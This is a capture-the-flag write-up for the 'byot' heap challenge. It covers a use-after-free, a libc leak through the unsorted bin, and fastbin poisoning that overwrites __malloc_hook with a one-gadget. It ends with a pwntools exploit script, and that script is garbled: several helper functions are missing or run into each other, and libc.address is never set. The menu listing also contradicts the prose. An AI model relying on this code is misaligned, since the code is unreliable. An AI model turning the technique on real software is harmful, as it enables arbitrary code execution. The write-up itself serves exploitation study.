### FUNCTIONALITY

mitigations: partial RELRO, PIE, NX, canary, ASLR

This binary allows us to create our own ecsc team through some distinct options:
```

1. Show the ECSC 2019 team
2. Show player
3. Select player
4. Add new player
```

We first need to clarify some things before continuing. Firstly, `3. Select player` synergizes with `2. Show player` as show player only prints our selected player. Second, `6. Edit player` lets us edit any of our player's fields (name, pwn, crypto, web, stega), our name can contain anything, while the other fields can only contain a max of 4 bytes of numbers (atoi)

Selecting `5. Remove player` lets us free() the player name and player struct allocations,the name of our player can be 128 bytes long maximum (it will be useful later) while the player struct is a fixed size

### THE VULNERABILITY

In remove_player() the program doesnt null out the global selected_player pointer even after freeing our currently selected one, allowing us to view and edit the contents of the selected player after he calling free on him 
```
int remove_player()
{
  unsigned int v1; // [rsp+0h] [rbp-10h]
  char nptr[4]; // [rsp+4h] [rbp-Ch] BYREF
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Enter the index of the player you would like to remove: ");
  read_input(nptr, 4);
  v1 = atoi(nptr);
  if ( v1 > 0xA || !players[v1] )
    return puts("[-] Invalid player index");
  ptr = (void *)players[v1];
  players[v1] = 0;
  free(*((void **)ptr + 2));
  free(ptr);
  return printf("[*] Player at index %u has been removed from the team\n", v1);
}
```

This gives us a UAF read and write primitive

### LEAKING LIBC

Remember how the name field can be up to 128 bytes? in glibc-2.24, there is no tcache so requested freed allocations with < 0x79 size end up on the fastbin while > 0x79 end up on the unsorted bin, our max name size is 0x80, so we can free a chunk into the unsorted bin and using our UAF read primitive we can leak a libc pointer:
```
request 0x71..0x78 -> chunk 0x80 -> fastbin
request 0x79..0x88 -> chunk 0x90 -> unsorted bin on free
```

### FASTBIN POISONING

We choose to target __malloc_hook:
```
fake_chunk = __malloc_hook - 0x23
fake_user  = __malloc_hook - 0x13
```

but why? 
- At runtime, __malloc_hook - 0x1b contains the byte 0x7f
- The fake chunk base is __malloc_hook - 0x23
- Its size field is at base + 0x8, which is exactly __malloc_hook - 0x1b
- The value 0x7f passes the fastbin size check for the 0x70 class
- The returned user pointer is __malloc_hook - 0x13

To poison a fastbin:
1. Create a 0x70-class name chunk.
2. Free it.
3. Use the dangling selected struct to overwrite its fd.

The write is: `p64(fake_chunk_addr)[:6]`

Only six 6 are written because strcpy appends a null byte. This works because the old fastbin fd was a heap pointer. Heap already have zero high bytes:

heap pointer: 0x000055xxxxxxxxxx
libc pointer: 0x00007fxxxxxxxxxx

Both have 00 00 in the top two bytes. Writing the low six bytes of the libc address and letting strcpy write the null byte at byte 6 produces a valid pointer

A name of length 0x60 requests malloc(0x61), which produces a 0x70 chunk. That matches the fake chunk’s size class.

The exploit needs two 0x70 allocations:
1. The first consumes the freed name chunk
2. The second returns the fake chunk at __malloc_hook - 0x23

### THE NULL BYTE PROBLEM

The long name writes 0x60 nonzero bytes plus a null byte. The bytes around __malloc_hook become:
__malloc_hook:
  [low 6 bytes of our data] [garbage] [garbage]

A valid libc pointer needs:
    0x00007fxxxxxxxxxx
so bytes 6 and 7 must be zero. strcpy cannot copy embedded null bytes, so we cannot write the complete pointer in one operation
The solution is to repair the hook afterward with two shorter edits

Let: H = __malloc_hook, U = H - 0x13

The gadget’s low six bytes go at U + 0x13 through U + 0x18

#### First edit

Payload length 0x1a: b'A' * 0x13 + low6 + b'B'

This writes:
```
H+0 .. H+5 : low six bytes of the one-gadget
H+6 : 'B', nonzero
H+7 : null terminator
```

#### Second edit
Payload length 0x19: b'A' * 0x13 + low6

This writes:
```
H+0 .. H+5 : low six bytes of the one-gadget again
H+6 : null terminator
H+7 : untouched, still zero from the first edit
```
Final result:
__malloc_hook = gadget_low6 | 0x0000

### FINAL ADJUSTMENTS AND TRIGGERING THE EXPLOIT

The long fake-chunk write corrupts the beginning of main_arena. We do not want to call select_player or any allocation between that write and the final trigger
To avoid that, the exploit arranges for the selected player’s struct to be reused by the player that receives the fake chunk.
The relevant allocations:
```
add_player(b'D' * 0x60) # 0x70 name, seed
add_player(b'E' * 0x30) # 0x40 name
add_player(b'F' * 0x60) # 0x70 victim

select_player(b'4') # select F
remove_player(b'0') # free D name
remove_player(b'4') # free F name; selected still points to F struct
```

After freeing D and F, the 0x70 fastbin is:
name_F -> name_D
Now poison name_F -> fd with __malloc_hook - 0x23
Next: `remove_player(b'3')`

Player E has a 0x30 length name, which is a 0x40 chunk. Its name goes into the 0x40 bin, so only structE enters the 0x20 fastbin.
The 0x20 fastbin becomes:
struct_E -> struct_F -> struct_D
Then:
```
add_player(b'G' * 0x60)
add_player(b'H' * 0x60)
```
- G’s struct gets struct_E.
- G’s name gets the freed name_F, leaving the fake chunk at the fastbin head
- H’s struct gets struct_F, which is still the selected struct
- H’s name gets the fake chunk
Because selected_player still points to struct_F, it now points to H’s struct automatically. This is why no select_player call is needed after the main_arena corruption

Repair the hook:
```
edit_selected_name(b'A' * 0x13 + low6 + b'B')
edit_selected_name(b'A' * 0x13 + low6)
```
Then trigger a malloc

note: we overwrite __malloc_hook with a one gadget

```
#!/usr/bin/env python3
from pwn import *

send = lambda x: io.send(x)

recvu = lambda x: io.recvuntil(x)

elf = ELF('./byot')
libc = ELF('./libc-2.24.so')

context(log_level='debug', binary=elf, terminal=["tmux", "split-window", "-h"], gdbinit='/home/achilla/.gdbinit-gef.py')

	if args.REMOTE:
		return remote(HOST, PORT)
	elif args.GDB:
		io = process(elf.path, aslr=False)
		gdb.attach(io, gdbscript)
		return io
	else:
		return process(elf.path)

def add_player(name):
    sendla(b': \n', b'4')
    sendla(b'name:', name)
    for i in range(4):
        sendla(b'[1-999]:', b'1')

def remove_player(idx):
    sendla(b': \n', b'5')
    sendla(b'remove:', idx)

    sendla(b': \n', b'6')
    sendla(b'choice:', b'1')
    sendla(b'selected player: \n', name)

def parse_name_leak():
    recvu(b'Name: ')
    leak = recvu(b'\n- Pwn:')

ONE_GADGET_OFF = 0x3f35a

one_gadget = libc.address + ONE_GADGET_OFF
low6 = p64(one_gadget)[:6]

edit_selected_name(b'A' * 0x13 + low6 + b'B')
edit_selected_name(b'A' * 0x13 + low6)

sendla(b': \n', b'4')
```
